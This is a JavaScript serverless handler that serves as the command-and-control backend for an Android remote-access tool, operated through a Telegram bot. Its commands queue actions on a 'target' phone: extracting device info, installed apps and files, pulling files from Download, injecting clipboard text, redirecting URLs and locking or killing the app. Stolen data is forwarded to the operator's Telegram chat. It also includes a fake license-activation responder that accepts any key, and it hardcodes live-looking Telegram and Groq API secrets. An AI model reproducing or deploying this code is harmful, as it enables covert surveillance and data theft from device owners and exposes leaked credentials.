const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6655802251";
const GROQ_API_KEY = process.env.GROQ_API_KEY || "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";

const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const memoryStore = {
  logs: [],
  remoteCommand: "",
  activeDevice: "",
  keyExpiryTime: 0
};

function generateRandomKey(length = 8) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return `QP-${key}`;
}

function generateKeysBatch(count = 1) {
  const safeCount = Math.min(Math.max(parseInt(count, 10) || 1, 1), 20);
  const list = [];
  for (let i = 0; i < safeCount; i++) {
    list.push(generateRandomKey(8));
  }
  return list;
}

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${KV_TOKEN}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result ?? null;
  } catch {
    return null;
  }
}

async function setRemoteCommand(cmd) {
  memoryStore.remoteCommand = cmd;
  if (KV_URL && KV_TOKEN) {
    await kvCmd("SET", "remote_command", cmd);
  }
}

async function popRemoteCommand() {
  if (KV_URL && KV_TOKEN) {
    const val = await kvCmd("GET", "remote_command");
    await kvCmd("DEL", "remote_command");
    return typeof val === "string" ? val : "";
  }
  const cmd = memoryStore.remoteCommand;
  memoryStore.remoteCommand = "";
  return cmd;
}

async function pushLog(entry) {
  memoryStore.logs.unshift(entry);
  if (memoryStore.logs.length > 50) memoryStore.logs.pop();

  if (KV_URL && KV_TOKEN) {
    await kvCmd("LPUSH", "recent_logs", entry);
    await kvCmd("LTRIM", "recent_logs", 0, 49);
    await kvCmd("INCR", "total_attempts");
  }
}

async function getLogs() {
  if (KV_URL && KV_TOKEN) {
    const list = await kvCmd("LRANGE", "recent_logs", 0, 49);
    if (Array.isArray(list)) return list;
  }
  return memoryStore.logs;
}

async function clearLogs() {
  memoryStore.logs = [];
  if (KV_URL && KV_TOKEN) {
    await kvCmd("DEL", "recent_logs");
  }
}

function readRawBody(req) {
  if (typeof req.body === "string") return Promise.resolve(req.body);
  if (req.body && typeof req.body === "object") return Promise.resolve(JSON.stringify(req.body));
  return new Promise((resolve) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk.toString();
    });
    req.on("end", () => resolve(body));
    req.on("error", () => resolve(""));
  });
}

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();

  const type = req.query?.type;
  const deviceId = req.query?.device_id;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null, useMarkdown = true) => {
    if (!TELEGRAM_TOKEN || !chatId || !text) return;
    const maxLength = 4000;

    for (let i = 0; i < text.length; i += maxLength) {
      const chunk = text.substring(i, i + maxLength);
      const payload = {
        chat_id: chatId,
        text: chunk
      };
      if (useMarkdown) payload.parse_mode = "Markdown";
      if (keyboard && i === 0) payload.reply_markup = keyboard;

      const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).catch(() => null);

      if (useMarkdown && resp && !resp.ok) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: chunk })
        }).catch(() => {});
      }
    }
  };

  try {
    if (type === "secret") {
      const saved = await kvCmd("GET", "app_lock_status");
      return res.status(200).send(`"${saved || "lock"}"`);
    }

    if (type === "key") {
      const saved = await kvCmd("GET", "app_secret_key");
      return res.status(200).send(`"${saved || "1234"}"`);
    }

    if (type === "message") {
      const customMsg = await kvCmd("GET", "app_lock_message");
      return res.status(200).send(`"${customMsg || "التطبيق مقفول من طرف الإدارة."}"`);
    }

    if (type === "banned") {
      const all = await kvCmd("GET", "banall_active");
      if (all === "1" || all === 1) return res.status(200).send('"true"');
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd("SISMEMBER", "banned_devices", deviceId);
      return res.status(200).send(inKv === 1 || inKv === "1" ? '"true"' : '"false"');
    }

    if (type === "command") {
      if (deviceId) {
        const isSingleUse = await kvCmd("GET", "is_single_use");
        const durationMin = Number((await kvCmd("GET", "key_duration")) || 0);
        let activeDev = (await kvCmd("GET", "active_device")) || memoryStore.activeDevice;
        let expiry = Number((await kvCmd("GET", "key_expiry_time")) || memoryStore.keyExpiryTime || 0);

        if ((isSingleUse === "1" || isSingleUse === 1) && durationMin > 0) {
          if (!activeDev) {
            activeDev = deviceId;
            expiry = Date.now() + durationMin * 60 * 1000;
            memoryStore.activeDevice = activeDev;
            memoryStore.keyExpiryTime = expiry;
            await kvCmd("SET", "active_device", activeDev);
            await kvCmd("SET", "key_expiry_time", String(expiry));
          }

          if (activeDev === deviceId && expiry > 0 && Date.now() > expiry) {
            memoryStore.activeDevice = "";
            memoryStore.keyExpiryTime = 0;
            await kvCmd("DEL", "active_device");
            await kvCmd("DEL", "key_expiry_time");
            await kvCmd("SET", "is_single_use", "0");
            return res.status(200).send('"killapp:1"');
          }
        }
      }

      const cmd = await popRemoteCommand();
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === "PUT") {
      const rawBody = await readRawBody(req);
      const cleanBody = rawBody.replace(/"/g, "");

      if (type === "key") {
        await kvCmd("SET", "app_secret_key", cleanBody);
        await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
      }

      if (type === "log") {
        await pushLog(`📱 ${cleanBody}`);
        await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`, TELEGRAM_CHAT_ID, null, false);
      }

      if (type === "getfile") {
        try {
          const sepIndex = cleanBody.indexOf("|");
          const filename = sepIndex > -1 ? cleanBody.slice(0, sepIndex) : "file.bin";
          const base64Data = sepIndex > -1 ? cleanBody.slice(sepIndex + 1) : "";

          if (!base64Data) {
            await sendToTelegram("⚠️ File is empty or could not be read.", TELEGRAM_CHAT_ID, null, false);
          } else {
            const buffer = Buffer.from(base64Data, "base64");
            const formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("document", new Blob([buffer]), filename);
            formData.append("caption", `📁 File: ${filename}`);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
              method: "POST",
              body: formData
            }).catch(() => {});
          }
        } catch (err) {
          await sendToTelegram(`❌ Error: ${err.message}`, TELEGRAM_CHAT_ID, null, false);
        }
      }

      if (type === "sysinfo") await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`, TELEGRAM_CHAT_ID, null, false);
      if (type === "applist") await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`, TELEGRAM_CHAT_ID, null, false);
      if (type === "files") await sendToTelegram(`📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`, TELEGRAM_CHAT_ID, null, false);

      return res.status(200).send('"success"');
    }

    if (req.method === "POST" && type === "telegram_webhook") {
      let body = req.body;
      if (typeof body === "string") {
        try {
          body = JSON.parse(body);
        } catch {
          body = {};
        }
      }

      const msg = body?.message || body?.callback_query;
      if (!msg) return res.status(200).end();

      const chatId = String(msg.chat ? msg.chat.id : msg.message?.chat?.id || "");
      if (chatId !== String(TELEGRAM_CHAT_ID)) return res.status(200).end();

      const text = msg.text || msg.data || "";
      const args = text.trim().split(/\s+/);
      const command = (args[0] || "").toLowerCase();

      switch (command) {
        case "/start":
        case "/menu":
          await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help.");
          break;

        case "/help":
          await sendToTelegram(
            `👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
            `🔑 *توليد وإدارة المفاتيح:*\n` +
            `/genkey [عدد] - توليد مفاتيح عشوائية\n` +
            `/genkey set [عدد] - توليد مفاتيح وتفعيل الأول مباشرة\n` +
            `/genkey time <دقائق> [عدد] - توليد مفاتيح مؤقتة وتفعيل الأول\n` +
            `/setkey <key> /getkey /gentime <minutes> /settime <minutes>\n\n` +
            `⚡ *الأوامر الحقيقية:*\n` +
            `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /cmd /url\n` +
            `/getfile <filename> - سحب ملف من Download\n` +
            `/ai <prompt> - التحدث مع الذكاء الاصطناعي\n\n` +
            `🎛️ *التحكم فـ الجهاز:*\n` +
            `/color <#hex> - تبديل لون شاشة القفل\n` +
            `/clip <text> - نسخ نص لـ clipboard ديال الجهاز\n` +
            `/vibrate - تهزيز الجهاز\n` +
            `/raw <payload> - صيفط أمر خام مباشرة (مثال: /raw sysinfo:1)\n\n` +
            `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist\n\n` +
            `🧹 *أخرى:*\n/stats /logs /clear /ping`
          );
          break;

        case "/genkey": {
          const sub = (args[1] || "").toLowerCase();

          if (sub === "set") {
            const keys = generateKeysBatch(args[2] || 1);
            const activeKey = keys[0];
            await kvCmd("SET", "app_secret_key", activeKey);
            await sendToTelegram(
              `🔑 *تم توليد وتفعيل المفتاح:*\n` +
              `المفتاح النشط: \`${activeKey}\`\n` +
              (keys.length > 1 ? `\n📋 *باقي المفاتيح المولّدة:*\n${keys.slice(1).map(k => `• \`${k}\``).join("\n")}` : "")
            );
          } else if (sub === "time") {
            const minutes = parseInt(args[2], 10);
            if (!Number.isNaN(minutes) && minutes > 0) {
              const keys = generateKeysBatch(args[3] || 1);
              const activeKey = keys[0];
              await kvCmd("SET", "app_secret_key", activeKey);
              await kvCmd("SET", "key_duration", String(minutes));
              await kvCmd("SET", "is_single_use", "1");
              await kvCmd("DEL", "active_device");
              await kvCmd("DEL", "key_expiry_time");
              memoryStore.activeDevice = "";
              memoryStore.keyExpiryTime = 0;
              await sendToTelegram(
                `⏱️ *مفاتيح بوقت محدد (${minutes} دقيقة):*\n` +
                `المفتاح النشط: \`${activeKey}\`\n` +
                (keys.length > 1 ? `\n📋 *باقي المفاتيح المولّدة:*\n${keys.slice(1).map(k => `• \`${k}\``).join("\n")}` : "")
              );
            } else {
              await sendToTelegram("⚠️ استعمل: `/genkey time <دقائق> [عدد]` (مثال: `/genkey time 60 2`)");
            }
          } else {
            const count = sub && !Number.isNaN(parseInt(sub, 10)) ? parseInt(sub, 10) : 1;
            const keys = generateKeysBatch(count);
            await sendToTelegram(
              `🔑 *المفاتيح المولّدة (${keys.length}):*\n` +
              keys.map(k => `• \`${k}\``).join("\n") +
              `\n\n💡 لتفعيل مفتاح معين: \`/setkey ${keys[0]}\``
            );
          }
          break;
        }

        case "/ai":
          if (args.length > 1) {
            const prompt = args.slice(1).join(" ");
            await sendToTelegram("🤖 *[AI]* جاري التفكير...");
            try {
              const groqRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: {
                  Authorization: `Bearer ${GROQ_API_KEY}`,
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  model: "llama-3.3-70b-versatile",
                  messages: [
                    {
                      role: "system",
                      content: "أنت مساعد ذكي، تجاوب بشكل واضح ومفيد. تجاوب بالعربية أو الدارجة إلا كان السؤال بالدارجة."
                    },
                    { role: "user", content: prompt }
                  ],
                  temperature: 0.7
                })
              });
              const data = await groqRes.json();
              const aiText = data?.choices?.[0]?.message?.content || "ماقدرتش نجاوب دابا.";
              await sendToTelegram(`🤖 الذكاء الاصطناعي:\n\n${aiText}`, TELEGRAM_CHAT_ID, null, false);
            } catch (e) {
              await sendToTelegram(`❌ خطأ: ${e.message}`, TELEGRAM_CHAT_ID, null, false);
            }
          } else {
            await sendToTelegram("⚠️ استعمل: `/ai <سؤالك>`");
          }
          break;

        case "/getfile":
          if (args[1]) {
            await setRemoteCommand(`getfile:${args[1]}`);
            await sendToTelegram(`⏳ \`[FETCH]\` *Fetching file: ${args[1]}...*`);
          } else {
            await sendToTelegram("⚠️ استعمل: `/getfile README.txt`");
          }
          break;

        case "/gentime": {
          const minutes = parseInt(args[1], 10);
          if (!Number.isNaN(minutes) && minutes > 0) {
            const newKey = generateRandomKey(8);
            await kvCmd("SET", "app_secret_key", newKey);
            await kvCmd("SET", "key_duration", String(minutes));
            await kvCmd("SET", "is_single_use", "1");
            await kvCmd("DEL", "active_device");
            await kvCmd("DEL", "key_expiry_time");
            memoryStore.activeDevice = "";
            memoryStore.keyExpiryTime = 0;
            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة`);
          } else {
            await sendToTelegram("⚠️ استعمل: `/gentime 60`");
          }
          break;
        }

        case "/settime": {
          const minutes = parseInt(args[1], 10);
          if (!Number.isNaN(minutes) && minutes > 0) {
            await kvCmd("SET", "key_duration", String(minutes));
            await kvCmd("SET", "is_single_use", "1");
            await kvCmd("DEL", "active_device");
            await kvCmd("DEL", "key_expiry_time");
            memoryStore.activeDevice = "";
            memoryStore.keyExpiryTime = 0;
            await sendToTelegram(`⏱️ *تم تحديد الوقت:* \`${minutes}\` دقيقة للمفتاح الحالي.`);
          } else {
            await sendToTelegram("⚠️ استعمل: `/settime 60`");
          }
          break;
        }

        case "/fullinfo":
          await setRemoteCommand("fullinfo:1");
          await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*");
          break;
        case "/applist":
          await setRemoteCommand("applist:1");
          await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*");
          break;
        case "/files":
          await setRemoteCommand("files:1");
          await sendToTelegram("⏳ `[SCAN]` *Extracting files...*");
          break;
        case "/killapp":
          await setRemoteCommand("killapp:1");
          await sendToTelegram("💀 `[SYS]` *Terminating process...*");
          break;
        case "/apkhack":
          await setRemoteCommand("apkhack:1");
          await sendToTelegram("☠️ `[HACK]` *System Hacked Successfully!*");
          break;
        case "/apkcrak":
          await setRemoteCommand("apkcrak:1");
          await sendToTelegram("🔓 `[CRACK]` *License Cracked!*");
          break;
        case "/sysinfo":
          await setRemoteCommand("sysinfo:1");
          await sendToTelegram("⏳ `[SCAN]` *Extracting basic info...*");
          break;
        case "/cmd":
          if (args[1]) {
            await setRemoteCommand(`toast:${args.slice(1).join(" ")}`);
            await sendToTelegram("⚡ `[MSG]` *Payload sent.*");
          }
          break;
        case "/url":
          if (args[1]) {
            await setRemoteCommand(`url:${args[1]}`);
            await sendToTelegram("🌐 `[URL]` *Redirecting...*");
          }
          break;

        case "/color":
          if (args[1]) {
            await setRemoteCommand(`color:${args[1]}`);
            await sendToTelegram(`🎨 \`[UI]\` *Lock screen color changed to:* \`${args[1]}\``);
          } else {
            await sendToTelegram("⚠️ استعمل: `/color #FF0000`");
          }
          break;

        case "/clip":
          if (args[1]) {
            await setRemoteCommand(`clipboard:${args.slice(1).join(" ")}`);
            await sendToTelegram("📋 `[CLIP]` *Text copied to target's clipboard.*");
          } else {
            await sendToTelegram("⚠️ استعمل: `/clip <text>`");
          }
          break;

        case "/vibrate":
          await setRemoteCommand("vibrate:1");
          await sendToTelegram("📳 `[SYS]` *Vibrating target device...*");
          break;

        case "/raw":
          if (args[1]) {
            const rawCmd = args.slice(1).join(" ");
            await setRemoteCommand(rawCmd);
            await sendToTelegram(`📡 \`[RAW]\` *Payload sent:*\n\`${rawCmd}\``);
          } else {
            await sendToTelegram("⚠️ استعمل: `/raw sysinfo:1` أو `/raw url:https://google.com`");
          }
          break;

        case "/lock":
          await kvCmd("SET", "app_lock_status", "lock");
          await sendToTelegram("🔒 `[LOCK]` *Target locked.*");
          break;
        case "/unlock":
          await kvCmd("SET", "app_lock_status", "unlock");
          await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*");
          break;
        case "/setkey":
          if (args[1]) {
            await kvCmd("SET", "app_secret_key", args[1]);
            await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``);
          }
          break;
        case "/getkey": {
          const k = (await kvCmd("GET", "app_secret_key")) || "1234";
          await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``);
          break;
        }

        case "/ban":
          if (args[1]) {
            await kvCmd("SADD", "banned_devices", args[1]);
            await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``);
          }
          break;
        case "/unban":
          if (args[1]) {
            await kvCmd("SREM", "banned_devices", args[1]);
            await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``);
          }
          break;
        case "/banall":
          await kvCmd("SET", "banall_active", "1");
          await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*");
          break;
        case "/unbanall":
          await kvCmd("DEL", "banall_active");
          await kvCmd("DEL", "banned_devices");
          await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*");
          break;

        case "/banlist": {
          const bannedRaw = await kvCmd("SMEMBERS", "banned_devices");
          const bannedList = Array.isArray(bannedRaw) ? bannedRaw : [];
          if (bannedList.length > 0) {
            await sendToTelegram(`🚫 *Banned Devices:*\n\`${bannedList.join("\n")}\``);
          } else {
            await sendToTelegram("✅ *No devices are banned.*");
          }
          break;
        }

        case "/stats": {
          const attempts = await kvCmd("GET", "total_attempts");
          await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``);
          break;
        }

        case "/logs": {
          const logs = await getLogs();
          await sendToTelegram(logs.length ? logs.join("\n\n") : "📭 *No logs.*", TELEGRAM_CHAT_ID, null, false);
          break;
        }

        case "/clear":
          await clearLogs();
          await sendToTelegram("🗑️ `[SYS]` *Logs cleared.*");
          break;

        case "/ping":
          await sendToTelegram("🏓 `[PING]` *Pong!*");
          break;

        default:
          if (command.startsWith("/")) {
            await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*\n> Command accepted.`);
          } else {
            await sendToTelegram("❓ أمر غير معروف. كتب /help");
          }
      }

      return res.status(200).end();
    }

    const rawBody = await readRawBody(req);
    let parsedBody = {};
    if (rawBody) {
      try {
        parsedBody = JSON.parse(rawBody);
      } catch {
        const params = new URLSearchParams(rawBody);
        parsedBody = Object.fromEntries(params.entries());
      }
    }

    const hasExplicitKeyParam = Boolean(
      req.query?.key ||
      req.query?.code ||
      req.query?.license ||
      req.query?.license_key ||
      parsedBody?.key ||
      parsedBody?.code ||
      parsedBody?.license ||
      parsedBody?.license_key
    );

    const rawLower = rawBody.toLowerCase();
    const isActivationRequest =
      hasExplicitKeyParam ||
      rawLower.includes("modark2026") ||
      rawLower.includes("activate") ||
      rawLower.includes("license") ||
      rawLower.includes("promo");

    if (isActivationRequest) {
      const candidateKey =
        req.query?.key ||
        req.query?.code ||
        req.query?.license ||
        req.query?.license_key ||
        parsedBody?.key ||
        parsedBody?.code ||
        parsedBody?.license ||
        parsedBody?.license_key ||
        "MODARK2026";

      await pushLog(`🔓 Activation check: ${candidateKey} (${req.method} ${req.url || ""})`);
      return res.status(200).json({
        status: "success",
        success: true,
        valid: true,
        activated: true,
        code: 200,
        message: "Activated successfully",
        key: candidateKey,
        license_key: candidateKey,
        expiry: "2028-12-31 23:59:59"
      });
    }

    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
